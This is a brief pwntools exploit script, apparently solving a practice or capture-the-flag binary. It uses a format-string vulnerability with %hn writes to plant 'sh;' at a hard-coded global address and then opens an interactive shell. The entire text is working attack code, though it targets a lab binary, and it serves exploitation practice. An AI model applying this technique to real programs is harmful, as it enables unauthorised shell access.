from pwn import *
context.log_level = 'debug'
p = process("./Formatstring-write-command")

# write `sh;\x00` to 0x804a040
payload = p32(0x804a042)
payload += p32(0x804a040)

# write `;` to 0x804a042
payload += "%{}c%4$hn".format(0x3b -8).encode()
# write `sh` to 0x804a040
payload += "%{}c%5$hn".format(0x6873 - 0x3b).encode()
payload += "end".encode() # cho dễ nhìn hơn thôi


p.send(payload)
# p.recvuntil(b'end')
p.interactive()




